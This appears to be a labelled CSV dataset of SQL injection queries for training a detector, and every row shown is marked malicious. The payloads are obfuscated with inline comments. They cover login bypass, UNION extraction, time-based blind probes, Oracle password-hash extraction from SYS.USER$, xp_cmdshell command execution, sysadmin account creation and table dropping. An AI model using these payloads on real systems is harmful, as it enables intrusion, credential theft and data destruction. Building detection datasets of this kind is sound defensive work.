Query,Label
" selec/**/t * fro/**/m users wh/**/ere id  =  '1' o/**/r 1^  =  1 union sele/**/ct 1,banner fro/**/m v$version whe/**/re rownum  =  1 -- 1'",1
" s/**/elect * fr/**/om users wh/**/ere id  =  '1' union s/**/elect ""?""_,version  (    )   -- 1'",1
selec/**/t * f/**/rom i/**/nfo/**/rmation_schema.ta/**/bles--,1
se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r \<\. o/**/r 1  =  1 -- 1,1
   (  sel/**/ect top 1,1
Ã½ o/**/r 1  =  1 --,1
a' --,1
 o/**/r 1  =  1 /*,1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r 1#"", union selec/**/t nul/**/l,version  (    )   -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  '1' union se/**/lect $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlogi/**/n 'name' , 'passwo/**/rd'",1
" selec/**/t * fro/**/m users w/**/here id  =  1   union selec/**/t n/**/ull,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" sele/**/ct * fr/**/om users w/**/here id  =  1 o/**/r "".  )  "" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 o/**/r @<@  =  1 union se/**/lect 1,version  (    )   -- 1",1
group b/**/y userid havi/**/ng 1  =  1--,1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 + \+%1 union sel/**/ect n/**/ull,@@VERSION -- 1",1
s/**/elect * fro/**/m users w/**/here id  =  1 *1 o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users w/**/here id  =  1 o/**/r @#"";  =  1 o/**/r 1  =  1 -- 1",1
‘ o/**/r 1  =  1 --,1
" sele/**/ct * f/**/rom users wher/**/e id  =  1 *\. union sel/**/ect nul/**/l,@@VERSION -- 1",1
sel/**/ect * fro/**/m users w/**/here id  =  1 %  (  @  )   o/**/r 1  =  1 -- 1,1
o/**/r 'a'  =  'a,1
declare @s varchar  (  22  )   sel/**/ect @s   = ,1
" selec/**/t * fr/**/om users wher/**/e id  =  1 union sel/**/ect 1<@,version  (    )   -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 + \+*\ union s/**/elect nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r 1#"". union sele/**/ct version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
s/**/elect * fr/**/om users w/**/here id  =  1 +  (  1  )   o/**/r 1  =  1 -- 1,1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 union sele/**/ct @ 1$,version  (    )   -- 1",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 union sel/**/ect @ 1a,version  (    )   -- 1",1
" se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r  @$#  =  1 union sel/**/ect 1,version  (    )   -- 1",1
" sele/**/ct * f/**/rom users whe/**/re id  =  '1' o/**/r   (  \.  )    =  1 union selec/**/t 1,@@VERSION -- 1'",1
 a/**/nd 1 i/**/n   (  selec/**/t var fr/**/om temp  )  --,1
" sele/**/ct * f/**/rom users wh/**/ere id  =  '1' union se/**/lect 1""!"",banner f/**/rom v$version wher/**/e rownum  =  1 -- 1'",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r ""1]"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 o/**/r ""$?"" o/**/r 1  =  1 -- 1",1
o/**/r x  =  x,1
o/**/r a  =  a,1
o/**/r '1'  =  '1,1
" se/**/lect * fro/**/m users wh/**/ere id  =  11<1# union s/**/elect 1,version  (    )   -- 1",1
   )    )    o/**/r    (    (   'x'   )    )     =     (    (   'x,1
" se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r \.<1 union sele/**/ct 1,@@VERSION -- 1'",1
" selec/**/t * f/**/rom users wher/**/e id  =  '1' <@&1 union se/**/lect 1,version  (    )   -- 1'",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  tabl/**/e_name  )   FRO/**/M   (  SELE/**/CT DI/**/STI/**/NCT  (  ta/**/ble_name  )  , ROWNUM AS LIM/**/IT FRO/**/M sys.all_ta/**/bles  )   WHER/**/E LI/**/MIT  =  4   )    )    A/**/ND 'i'  =  'i",1
; if i/**/s_srvrolemember  (  'sysadmi/**/n'  )   > 0 waitfo/**/r delay '0:0:2' --,1
selec/**/t * f/**/rom users w/**/here id  =  1 <@<@ o/**/r 1  =  1 -- 1,1
" s/**/elect * fr/**/om users w/**/here id  =  1 union s/**/elect @<@$,version  (    )   -- 1",1
" se/**/lect * fro/**/m users whe/**/re id  =  '1' <@<@ union se/**/lect 1,version  (    )   -- 1'",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r ""$_"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r 1#""{ union selec/**/t version  (    )  ,version  (    )   -- 1",1
a' o/**/r 1  =  1--,1
 )   o/**/r   (  a  =  a,1
"""   )    )    o/**/r    (    (   ""x""   )    )     =     (    (   ""x",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r 1#""; o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  '1' <@$_ union sele/**/ct 1,version  (    )   -- 1'",1
-- &passwo/**/rd  = ,1
sel/**/ect * fr/**/om users wher/**/e id  =  1 <@. o/**/r 1  =  1 -- 1,1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r ""  (    )  "" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 %$ 1 union selec/**/t nu/**/ll,@@VERSION -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  granted_role  )   FR/**/OM   (  SE/**/LECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LIMI/**/T F/**/ROM dba_role_privs WHE/**/RE GRANTEE  =  SYS.LOGI/**/NUSER  )   WHE/**/RE LIM/**/IT  =  3   )    )    AN/**/D 'i'  =  'i",1
 o/**/r '1'  =  '1,1
admi/**/n' o/**/r 1  =  1,1
" sele/**/ct * f/**/rom users wh/**/ere id  =  1 o/**/r "";,""  =  1 o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users w/**/here id  =  1 union sel/**/ect @||1,version  (    )   -- 1",1
" sele/**/ct * fr/**/om users whe/**/re id  =  1 +\+. union se/**/lect nul/**/l,@@VERSION -- 1",1
" sele/**/ct * f/**/rom users w/**/here id  =  1 o/**/r ""  )  ,"" o/**/r 1  =  1 -- 1",1
" union sel/**/ect * fro/**/m users wh/**/ere logi/**/n   =   char  (  114,111,111,116  )  ;",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r 1#""? union selec/**/t 1,version  (    )   -- 1",1
 o/**/r 1  =  1--,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT F/**/ROM dba_role_privs WH/**/ERE GRANTEE  =  SYS.LOGI/**/NUSER  )   W/**/HERE LIM/**/IT  =  5   )    )    A/**/ND 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ o/**/r 3  =  3 --,1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 -1<@ union selec/**/t 1,version  (    )   -- 1",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r ""$#"" o/**/r 1  =  1 -- 1",1
 )   union selec/**/t * fro/**/m i/**/nfo/**/rmation_schema.tabl/**/es;,1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 o/**/r ""  )  ]"" o/**/r 1  =  1 -- 1",1
"  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT COUNT  (  DI/**/STI/**/NCT  (  column_name   )    )    F/**/ROM sys.all_tab_columns   )    )    A/**/ND 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  t/**/able_name  )   F/**/ROM   (  SE/**/LECT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS L/**/IMIT FRO/**/M sys.all_t/**/ables  )   WHE/**/RE LIM/**/IT  =  7   )    )    AN/**/D 'i'  =  'i",1
""" o/**/r """" """,1
delet/**/e,1
;waitfo/**/r delay '0:0:__TIME__'--,1
 o/**/r 1  =  1 --,1
1' a/**/nd non_exi/**/stant_ta/**/ble   =   '1,1
" sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r ""&  )  "" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users w/**/here id  =  '1' + $ . union sel/**/ect 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   s/**/elect @s   =   0x77616974 ...,1
x' AN/**/D userid I/**/S NUL/**/L; --,1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r "";["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users w/**/here id  =  '1' o/**/r \.<   =  1 union se/**/lect 1,@@VERSION -- 1'",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 union se/**/lect @<@,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wher/**/e id  =  1 -@<@ union selec/**/t 1,version  (    )   -- 1",1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT host_name F/**/ROM v$i/**/nstance   )    )    AN/**/D 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  S/**/ELECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LI/**/MIT FR/**/OM all_tab_columns  )   WHE/**/RE LI/**/MIT  =  2   )    )    AN/**/D 'i'  =  'i",1
se/**/lect * fr/**/om users wher/**/e id  =  1 +   (  \+  )   o/**/r 1  =  1 -- 1,1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r "".["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r ""  (  ["" o/**/r 1  =  1 -- 1",1
UNION ALL SELE/**/CT,1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r ""1#"" o/**/r 1  =  1 -- 1",1
se/**/lect * fr/**/om users whe/**/re id  =  1 o/**/r \<1 o/**/r 1  =  1 -- 1,1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1 | |1 union se/**/lect 1,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
x' o/**/r full_name l/**/ike '%bob%,1
x' an/**/d members.email i/**/s NUL/**/L; --,1
 o/**/r 2 > 1,1
s/**/elect * f/**/rom users wh/**/ere id  =  1.*1 o/**/r 1  =  1 -- 1,1
"""  )   o/**/r pg_sleep  (  __TIME__  )  --",1
 ',1
" sele/**/ct * fro/**/m users w/**/here id  =  1 o/**/r $<\. union sele/**/ct 1,@@VERSION -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r ""@  )  "" o/**/r 1  =  1 -- 1",1
s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r \.<$ o/**/r 1  =  1 -- 1,1
 )   o/**/r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" sele/**/ct * fro/**/m users whe/**/re id  =  '1' + 1||1 union se/**/lect 1,banner fr/**/om v$version whe/**/re rownum  =  1 -- 1'",1
se/**/lect * f/**/rom users whe/**/re id  =  1 + $+%\ o/**/r 1  =  1 -- 1,1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r "";  (  "" o/**/r 1  =  1 -- 1",1
o/**/r sleep  (  __TIME__  )    =  ',1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r "";_"" o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r 1#"". union s/**/elect 1,version  (    )   -- 1",1
" s/**/elect * f/**/rom users wh/**/ere id  =  1 union sel/**/ect  @ $,version  (    )   -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  1 union sele/**/ct +!<@,version  (    )   -- 1",1
" se/**/lect * fr/**/om users whe/**/re id  =  1 <@<@ union selec/**/t nu/**/ll,version  (    )   -- 1",1
o/**/r 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anythi/**/ng' O/**/R 'x'  =  'x,1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r \<\ union se/**/lect 1,@@VERSION -- 1",1
" sele/**/ct * f/**/rom users whe/**/re id  =  1 union sele/**/ct   (  1  )  ,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 *  (  \  )   union sele/**/ct n/**/ull,@@VERSION -- 1",1
&',1
a' o/**/r 3  =  3--,1
" sele/**/ct * fr/**/om users whe/**/re id  =  '1' o/**/r $+<$ union s/**/elect 1,@@VERSION -- 1'",1
" s/**/elect * fr/**/om users w/**/here id  =  1 +1 union se/**/lect 1,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1",1
"admi/**/n""o/**/r 1  =  1 o/**/r """"  =  """,1
uni/**/on sel/**/ect,1
""" o/**/r """"&""",1
 )    )   ;waitfo/**/r delay '0:0:__TIME__'--,1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r ""?;"" o/**/r 1  =  1 -- 1",1
1 waitfo/**/r delay '0:0:10'--,1
bfilename,1
admi/**/n'  )   o/**/r   (  '1'  =  '1'--,1
UEf,1
 -- &passwo/**/rd  = ,1
1 o/**/r sleep  (  __TIME__  )  #,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  ta/**/ble_name  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS LIMI/**/T F/**/ROM sys.all_tabl/**/es  )   W/**/HERE L/**/IMIT  =  6   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fr/**/om users wh/**/ere id  =  '1' union sel/**/ect $[""],@@VERSION -- 1'",1
" s/**/elect * fro/**/m users wher/**/e id  =  '1' + @  (  1  )   union sel/**/ect 1,version  (    )   -- 1'",1
1' an/**/d 1  =    (  se/**/lect count  (  *  )   f/**/rom ta/**/blenames  )  ; --,1
o/**/r sleep  (  __TIME__  )  #,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  granted_role  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT FRO/**/M dba_role_privs W/**/HERE GRANTEE  =  SYS.LOGI/**/NUSER  )   WH/**/ERE LIMI/**/T  =  8   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 o/**/r 1#"",  =  1 o/**/r 1  =  1 -- 1",1
||6,1
o/**/r 1/*,1
" an/**/d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
sele/**/ct * f/**/rom users wh/**/ere id  =  1.%@ o/**/r 1  =  1 -- 1,1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r ""..""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r 1&@#  =  1 union selec/**/t 1,version  (    )   -- 1",1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r "";]"" o/**/r 1  =  1 -- 1",1
" o/**/r 1  =  1 o/**/r """"  =  ",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIM/**/IT F/**/ROM SYS.USER$  )   WHE/**/RE L/**/IMIT  =  7   )    )    AN/**/D 'i'  =  'i",1
s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r $<\. o/**/r 1  =  1 -- 1,1
" sele/**/ct * f/**/rom users w/**/here id  =  1 *  (  1  )   union se/**/lect 1,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1",1
o/**/r 'whatever' i/**/n   (  'whatever'  ) ,1
declare @s varchar   (  200  )   s/**/elect @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
s/**/elect * f/**/rom users whe/**/re id  =  '1'   o/**/r 1  =  1 -- 1',1
?,1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T COUNT  (  DI/**/STI/**/NCT  (  ta/**/ble_name   )    )    FRO/**/M sys.all_tabl/**/es   )    )    A/**/ND 'i'  =  'i,1
" se/**/lect * f/**/rom users wh/**/ere id  =  '1' union sele/**/ct @ 1,version  (    )   --  1'",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""#",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r 1#"", union sele/**/ct 'a',version  (    )   -- 1",1
" se/**/lect * fr/**/om users whe/**/re id  =  1 o/**/r ""$  (  "" o/**/r 1  =  1 -- 1",1
 o/**/r '' ',1
" se/**/lect * fro/**/m users w/**/here id  =  1 o/**/r "";#"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1,1
 ; d/**/rop t/**/able temp --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS L/**/IMIT FR/**/OM SYS.USER$  )   WHE/**/RE LIMI/**/T  =  2   )    )    A/**/ND 'i'  =  'i",1
""" o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
""" o/**/r ""x""  =  ""x",1
s/**/elect * f/**/rom users w/**/here id  =  '1'<@.. o/**/r 1  =  1 -- 1',1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r !<@ union sele/**/ct 1,version  (    )   -- 1",1
 o/**/r 'somethi/**/ng' li/**/ke 'some%',1
; if n/**/ot   (    (   s/**/elect serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 0  )   waitfo/**/r delay '0:0:2' --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  S/**/ELECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIMI/**/T FRO/**/M SYS.USER$  )   WHE/**/RE LI/**/MIT  =  4   )    )    AN/**/D 'i'  =  'i",1
se/**/lect * f/**/rom users wher/**/e id  =  '1' o/**/r \<\. o/**/r 1  =  1 -- 1',1
; exec master..xp_cmdshell 'pi/**/ng 10.10.1.2'--,1
admi/**/n' o/**/r '1'  =  '1'--,1
; if no/**/t   (    (   selec/**/t serverproperty  (  'i/**/si/**/ntegratedsecurityonly'   )    )    <> 1  )   waitfo/**/r delay '0:0:2' --,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  tab/**/le_name  )   F/**/ROM   (  SELEC/**/T DI/**/STI/**/NCT  (  t/**/able_name  )  , ROWNUM AS LIMI/**/T FR/**/OM sys.all_tab/**/les  )   WH/**/ERE L/**/IMIT  =  2   )    )    A/**/ND 'i'  =  'i",1
" sele/**/ct * fr/**/om users w/**/here id  =  1 <@<@ union selec/**/t version  (    )  ,version  (    )   -- 1",1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r 1#""$ union se/**/lect n/**/ull,version  (    )   -- 1",1
""";waitfo/**/r delay '0:0:__TIME__'--",1
x' a/**/nd userid i/**/s NUL/**/L; --,1
sel/**/ect * fro/**/m users wh/**/ere id  =  '1' *$ 1 o/**/r 1  =  1 -- 1',1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r \<\ union sele/**/ct nu/**/ll,@@VERSION -- 1",1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r ""?@"" o/**/r 1  =  1 -- 1",1
’ o/**/r ‘1’  =  ’1,1
" s/**/elect * f/**/rom users wher/**/e id  =  '1' union se/**/lect 1a,banner f/**/rom v$version w/**/here rownum  =  1 -- 1'",1
admi/**/n'o/**/r 1  =  1 o/**/r ''  =  ',1
" sel/**/ect * f/**/rom users wher/**/e id  =  '1' o/**/r !<1 union selec/**/t 1,version  (    )   -- 1'",1
" a/**/nd 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
exec  (  @s  ) ,1
" se/**/lect * fro/**/m users whe/**/re id  =  1 o/**/r ""_  )  "" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fr/**/om users whe/**/re id  =  1 o/**/r \.<   =  1 union sele/**/ct 1,@@VERSION -- 1",1
 o/**/r 1  =  1,1
s/**/elect * f/**/rom users wh/**/ere id  =  1 + $+%1 o/**/r 1  =  1 -- 1,1
" s/**/elect * fro/**/m users wh/**/ere id  =  1.  union selec/**/t version  (    )  ,version  (    )   -- 1",1
x' A/**/ND email I/**/S NU/**/LL; --,1
" sel/**/ect * f/**/rom users wh/**/ere id  =  '1' + @ @1 union s/**/elect 1,version  (    )   -- 1'",1
 --,1
" sel/**/ect * fr/**/om users w/**/here id  =  '1'   union selec/**/t nul/**/l,banner f/**/rom v$version w/**/here rownum  =  1 -- 1'",1
" selec/**/t * fro/**/m users whe/**/re id  =  11||1 union sele/**/ct 1,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1.*1 union selec/**/t 1,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
updat/**/e,1
 o/**/r 1/*,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1.<1# union s/**/elect 1,version  (    )   -- 1",1
"""   )    )    o/**/r pg_sleep  (  __TIME__  )  --",1
||'6,1
" sel/**/ect * fr/**/om users wher/**/e id  =  1. <@ union s/**/elect 1,version  (    )   -- 1",1
o/**/r   (  EXI/**/STS  ) ,1
^',1
o/**/r 'text'   =   n'text',1
" sele/**/ct * fro/**/m users wh/**/ere id  =  1 + \+*$ union s/**/elect nu/**/ll,@@VERSION -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  '1' union se/**/lect $ _,@@VERSION -- 1'",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r ""  )  ;"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 <@1$ union sele/**/ct 1,version  (    )   -- 1",1
 o/**/r 0  =  0 --,1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""{1""  =  1 o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r ""{,""  =  1 o/**/r 1  =  1 -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r 1#"", union sel/**/ect version  (    )  ,version  (    )   -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r 1#""? union se/**/lect 'a',version  (    )   -- 1",1
passwo/**/rd:*/  =  1--,1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 <@. union sele/**/ct 1,version  (    )   -- 1",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 o/**/r ""  )  @"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users wher/**/e id  =  '1' union se/**/lect @ @1,version  (    )   --  1'",1
" union   (  sele/**/ct N/**/ULL,   (  se/**/lect @@version   )    )    --",1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r ""  )  {"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * f/**/rom users wher/**/e id  =  1.<@. union se/**/lect 1,version  (    )   -- 1",1
" selec/**/t * fr/**/om users wh/**/ere id  =  1 +\. union sel/**/ect n/**/ull,@@VERSION -- 1",1
" selec/**/t * fr/**/om users w/**/here id  =  1 + @<@. union s/**/elect 1,version  (    )   -- 1",1
" selec/**/t * f/**/rom users w/**/here id  =  1 o/**/r \<$ union sel/**/ect 1,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r   (  $+  )    =  1 union sel/**/ect 1,@@VERSION -- 1",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 +   (  \+  )   union se/**/lect nul/**/l,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users wh/**/ere id  =  1. union se/**/lect nul/**/l,version  (    )   -- 1",1
" se/**/lect * fro/**/m users wh/**/ere id  =  1 o/**/r ""  )  ["" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id  =  1 o/**/r \.<1 union s/**/elect 1,@@VERSION -- 1",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT banner FR/**/OM v$version W/**/HERE ROWNUM  =  1   )    )    AN/**/D 'i'  =  'i,1
sel/**/ect * fro/**/m users whe/**/re id  =  1 <@$_ o/**/r 1  =  1 -- 1,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  column_name  )   FR/**/OM   (  SELE/**/CT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns  )   W/**/HERE LIMI/**/T  =  3   )    )    AN/**/D 'i'  =  'i",1
" s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r $+<$ union sel/**/ect 1,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r ""@%"" o/**/r 1  =  1 -- 1",1
" sele/**/ct * fro/**/m users w/**/here id  =  1 o/**/r $<\ union se/**/lect 1,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r ""%,"" o/**/r 1  =  1 -- 1",1
UNION SE/**/LECT,1
a/**/sc,1
" || myappadmi/**/n.adduser  (  'admi/**/n', 'newpass'  )   || '",1
"exec sp_addsrvrolemember 'name' , 'sysadmi/**/n'",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r   (  \  )    =  1 union selec/**/t 1,@@VERSION -- 1",1
  )   o/**/r true--,1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 +  (  1  )   union sele/**/ct 1,banner fro/**/m v$version w/**/here rownum  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIM/**/IT FRO/**/M SYS.USER$  )   WH/**/ERE LI/**/MIT  =  3   )    )    A/**/ND 'i'  =  'i",1
 o/**/r userid lik/**/e '%,1
" union   (  se/**/lect NU/**/LL, NU/**/LL,   (  selec/**/t @@version   )    )    --",1
/,1
s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r $<\ o/**/r 1  =  1 -- 1,1
"admi/**/n""/*",1
" selec/**/t * fro/**/m users whe/**/re id  =  1.  union sele/**/ct 1,version  (    )   -- 1",1
 )  ;waitfo/**/r delay '0:0:__TIME__'--,1
" selec/**/t * f/**/rom users whe/**/re id  =  1 union selec/**/t @<@.,version  (    )   -- 1",1
